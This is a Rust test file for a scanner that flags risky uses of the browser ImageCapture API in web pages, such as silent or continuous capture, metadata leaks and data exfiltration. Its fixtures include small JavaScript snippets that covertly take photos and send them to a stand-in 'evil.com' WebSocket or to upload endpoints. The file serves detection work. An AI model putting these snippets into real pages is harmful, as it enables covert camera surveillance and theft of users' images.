use crate::image_capture_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_image_capture("");
    assert!(issues.is_empty());
}

#[test]
fn no_api_no_issues() {
    let body = "<html><body>Hello world</body></html>";
    let issues = analyze_image_capture(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_image_capture_constructor() {
    let body = "const capture = new ImageCapture(track);";
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ApiDetected));
}

#[test]
fn detects_lowercase_image_capture() {
    let body = "const ic = navigator.imageCapture;";
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ApiDetected));
}

#[test]
fn detects_take_photo_as_api() {
    let body = "capture.takePhoto().then(blob => { notification('done'); });";
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ApiDetected));
}

#[test]
fn detects_grab_frame_as_api() {
    let body = "capture.grabFrame().then(bitmap => { indicator.show(); });";
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ApiDetected));
}

#[test]
fn detects_silent_capture() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.takePhoto();
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::SilentCapture));
}

#[test]
fn no_silent_capture_with_notification() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.takePhoto();
        notification('photo taken');
    "#;
    let issues = analyze_image_capture(body);
    assert!(!issues.contains(&ImageCaptureIssue::SilentCapture));
}

#[test]
fn no_silent_capture_with_indicator() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.grabFrame();
        indicator.style.display = 'block';
    "#;
    let issues = analyze_image_capture(body);
    assert!(!issues.contains(&ImageCaptureIssue::SilentCapture));
}

#[test]
fn no_silent_capture_with_alert() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.takePhoto();
        alert('captured');
    "#;
    let issues = analyze_image_capture(body);
    assert!(!issues.contains(&ImageCaptureIssue::SilentCapture));
}

#[test]
fn detects_data_exfiltration_fetch() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.takePhoto().then(blob => {
            fetch('/upload', {method: 'POST', body: blob});
        });
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::DataExfiltration));
}

#[test]
fn detects_data_exfiltration_websocket() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.grabFrame();
        const ws = new WebSocket('ws://evil.com');
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::DataExfiltration));
}

#[test]
fn detects_continuous_capture() {
    let body = r#"
        const capture = new ImageCapture(track);
        setInterval(() => capture.takePhoto(), 1000);
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ContinuousCapture));
}

#[test]
fn detects_continuous_capture_raf() {
    let body = r#"
        const capture = new ImageCapture(track);
        requestAnimationFrame(function loop() {
            capture.grabFrame();
            requestAnimationFrame(loop);
        });
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ContinuousCapture));
}

#[test]
fn detects_metadata_leak() {
    let body = r#"
        const capture = new ImageCapture(track);
        capture.getPhotoCapabilities().then(caps => {
            fetch('/collect', {method: 'POST', body: JSON.stringify(caps)});
        });
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::MetadataLeak));
}

#[test]
fn all_issues_detected() {
    let body = r#"
        const capture = new ImageCapture(track);
        setInterval(() => capture.takePhoto(), 500);
        capture.getPhotoCapabilities().then(caps => {
            fetch('/exfil', {method:'POST', body: JSON.stringify(caps)});
        });
    "#;
    let issues = analyze_image_capture(body);
    assert!(issues.contains(&ImageCaptureIssue::ApiDetected));
    assert!(issues.contains(&ImageCaptureIssue::SilentCapture));
    assert!(issues.contains(&ImageCaptureIssue::DataExfiltration));
    assert!(issues.contains(&ImageCaptureIssue::ContinuousCapture));
    assert!(issues.contains(&ImageCaptureIssue::MetadataLeak));
    assert_eq!(issues.len(), 5);
}

#[test]
fn severity_values() {
    assert_eq!(image_capture_severity(&ImageCaptureIssue::ApiDetected), 2.0);
    assert_eq!(
        image_capture_severity(&ImageCaptureIssue::SilentCapture),
        8.0
    );
    assert_eq!(
        image_capture_severity(&ImageCaptureIssue::DataExfiltration),
        7.5
    );
    assert_eq!(
        image_capture_severity(&ImageCaptureIssue::ContinuousCapture),
        6.5
    );
    assert_eq!(
        image_capture_severity(&ImageCaptureIssue::MetadataLeak),
        5.5
    );
}

#[test]
fn display_variants() {
    assert_eq!(ImageCaptureIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        ImageCaptureIssue::SilentCapture.to_string(),
        "silent_capture"
    );
    assert_eq!(
        ImageCaptureIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        ImageCaptureIssue::ContinuousCapture.to_string(),
        "continuous_capture"
    );
    assert_eq!(ImageCaptureIssue::MetadataLeak.to_string(), "metadata_leak");
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        ImageCaptureIssue::ApiDetected,
        ImageCaptureIssue::SilentCapture,
        ImageCaptureIssue::DataExfiltration,
    ];
    let mut seq = 0;
    let ops = image_capture_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}
